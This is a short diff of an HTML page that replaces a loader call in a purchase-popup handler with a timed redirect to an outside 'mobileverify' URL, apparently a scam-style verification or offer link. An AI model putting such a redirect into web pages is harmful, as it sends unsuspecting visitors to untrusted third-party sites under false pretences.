@@ -1,4 +1,4 @@
-
+<!DOCTYPE html>
 <html lang="en" dir="ltr">
 
 <head>
@@ -1385,9 +1385,10 @@
         </div>
       `;
             setTimeout(() => {
-                og_load();
-                closePurchasePopup();
-            }, 3000);
+    window.location.href = "https://mobileverify.net/cl/i/dv6dmw";
+    closePurchasePopup();
+}, 3000);
+
         }
         const showErrorState = (username, itemName, itemImages) => {
             const popupContent = document.querySelector('.popup-content');
